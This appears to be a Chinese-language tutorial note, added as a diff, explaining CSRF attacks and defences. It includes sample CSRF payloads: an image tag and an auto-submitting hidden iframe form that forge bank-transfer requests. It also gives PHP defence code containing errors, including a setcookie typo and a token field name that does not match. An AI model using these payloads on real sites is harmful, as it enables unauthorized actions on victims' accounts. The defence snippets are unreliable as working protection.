@@ -1,0 +1,96 @@
+第一部分 CSRF是什么
+cross-site-request-forgery 跨站请求伪造 也被称为one click attack/session riding 缩写 CSRF/XSRF
+第二部分 CSRF可以做什么
+攻击者盗用你的身份 以你的名义发送而已请求。
+(1)用户浏览登录A
+(2)验证通过，在用户产生A站cookie
+(3)用户没有登出A情况 访问危险网站B
+(4)B要求访问三方站点A 发出请求
+(5)携带cookie访问A
+例子
+GET <img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>
+POST
+<form action="Transfer.php" method="POST">
+　　　　<p>ToBankId: <input type="text" name="toBankId" /></p>
+　　　　<p>Money: <input type="text" name="money" /></p>
+　　　　<p><input type="submit" value="Transfer" /></p>
+</form>
+<?php
+　　　　session_start();
+　　　　if (isset($_REQUEST['toBankId'] &&　isset($_REQUEST['money']))
+　　　　{
+　　　　    buy_stocks($_REQUEST['toBankId'],　$_REQUEST['money']);
+　　　　}
+　　?>
+<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>
+
+3
+<?php
+　　　　session_start();
+　　　　if (isset($_POST['toBankId'] &&　isset($_POST['money']))
+　　　　{
+　　　　    buy_stocks($_POST['toBankId'],　$_POST['money']);
+　　　　}
+　　?>
+
+<html>
+　　<head>
+　　　　<script type="text/javascript">
+　　　　　　function steal()
+　　　　　　{
+          　　　　 iframe = document.frames["steal"];
+　　     　　      iframe.document.Submit("transfer");
+　　　　　　}
+　　　　</script>
+　　</head>
+
+　　<body onload="steal()">
+　　　　<iframe name="steal" display="none">
+　　　　　　<form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php">
+　　　　　　　　<input type="hidden" name="toBankId" value="11">
+　　　　　　　　<input type="hidden" name="money" value="1000">
+　　　　　　</form>
+　　　　</iframe>
+　　</body>
+</html>
+CSRF攻击是源于WEB的隐式身份验证机制！
+WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，
+但却无法保证该请求是用户批准发送的！
+
+第三部分 CSRF的防御
+1.服务端CSRF防御 思想 页面增加伪随机数
+(1) cookie hashing 最简单 攻击者不能获取第三方cookie
+<?php
+    $value = '';
+    setcookie('cookie'm $value, time()+ 3600)
+?>
+在表单中增加hash值 认证当前确实是用户发送的请求
+<?php
+    $hash = md5($_COOKIE['cookie']);
+?>
+<form method=”POST” action=”transfer.php”>
+　　　　<input type=”text” name=”toBankId”>
+　　　　<input type=”text” name=”money”>
+　　　　<input type=”hidden” name=”hash” value=”<?=$hash;?>”>
+　　　　<input type=”submit” name=”submit” value=”Submit”>
+</form>
+
+然后在服务端进行hash值认证
+<?php
+　　      if(isset($_POST['check'])) {
+     　　      $hash = md5($_COOKIE['cookie']);
+          　　 if($_POST['check'] == $hash) {
+               　　 doJob();
+　　           } else {
+　　　　　　　　//...
+          　　 }
+　　      } else {
+　　　　　　//...
+　　      }
+      ?>
+
+若xss攻击 无法防御
+(2)验证码
+(3) one-time tokens 不同表单包含一个不同的伪随机值
+并行会话的兼容
+如果用户在一个站点同时打开了两个不同表单 CSRF保护措施不应该影响到他对任何表单提交。
